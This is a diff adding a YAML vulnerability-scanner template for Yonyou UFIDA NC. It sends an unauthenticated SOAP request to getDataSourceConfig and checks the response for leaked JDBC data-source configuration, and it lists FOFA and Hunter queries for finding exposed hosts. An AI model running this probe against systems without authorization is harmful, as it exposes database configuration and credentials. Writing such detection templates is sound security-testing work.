@@ -1,0 +1,32 @@
+id: yonyou_nc_getdatasourceconfig_unauthorized
+
+info:
+  name: yonyou_nc_getdatasourceconfig_unauthorized.yaml
+  author: Xc1Ym
+  severity: medium
+  description: 用友UFIDA NC getDataSourceConfig存在信息泄露漏洞
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-UFIDA-NC"
+    hunter-query: app.name="用友 UFIDA NC"
+  tags: unauthorized,OA,yonyou,hw
+
+http:
+  - method: POST
+    path:
+      - "{{RootURL}}/uapws/service/nc.itf.ses.inittool.SESInitToolService"
+    headers: {}
+    body: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ses=\"http://inittool.ses.itf.nc/SESInitToolService\"><soapenv:Header/><soapenv:Body><ses:getDataSourceConfig/></soapenv:Body></soapenv:Envelope>"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - jdbc
+          - soap:Envelope
+        condition: and
+      - type: word
+        part: header
+        words:
+          - Apache-Coyote/1.1
+    matchers-condition: and
